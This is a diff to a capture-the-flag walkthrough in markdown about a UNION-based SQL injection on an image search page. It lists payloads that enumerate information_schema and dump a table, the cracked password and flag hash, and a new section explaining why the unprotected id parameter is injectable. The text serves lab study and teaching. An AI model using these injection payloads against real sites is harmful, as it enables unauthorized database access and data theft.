@@ -9,18 +9,33 @@
 go to `/?page=searchimg`
 
 submit :
-- `1 AND 1=2 UNION SELECT column_name , 1 FROM information_schema.columns`
-- `1 AND 1=2 UNION SELECT table_name , 1 FROM information_schema.columns`
-- `1 AND 1=2 UNION SELECT table_schema, 1 FROM information_schema.tables`
+- `1 UNION SELECT column_name , 1 FROM information_schema.columns`
+- `1 UNION SELECT table_name , 1 FROM information_schema.columns`
+- `1 UNION SELECT table_schema, 1 FROM information_schema.tables`
 
 then \
-`1 AND 1=2 UNION SELECT title, comment FROM Member_images.list_images`
+`1 UNION SELECT title, comment FROM Member_images.list_images`
 
 "If you read this just use this md5 decode lowercase then sha256 to win this flag ! : 1928e8083cf461a51303633093573c46"
 
 password => 1928e8083cf461a51303633093573c46 => albatroz
 
 albatroz => sha256 => f2a29020ef3132e01dd61df97fd33ec8d7fcd1388cc9601e7db691d17d4d6188
+
+---
+
+## How does it work ?
+
+The query executed by the server is probably like `SELECT title, Url FROM Member_images.list_images WHERE id= ` and then it is filled with the parameter sent by the client which should be a number. The id parameter is not protected, which means that you can inject SQL without the server detecting any problem.
+
+You have to send a valid parameter to respect the SQL syntax : \
+`SELECT title, Url FROM Member_images.list_images WHERE id=1`
+
+And then the door is opened to append another query to the current string :
+
+`SELECT title, Url FROM Member_images.list_images WHERE id=1 UNION SELECT title, comment FROM Member_images.list_images`
+
+The UNION statement allows us to get two other columns (the number of queried columns should be the same as in the first part of the query) from the table we want.
 
 ---
 
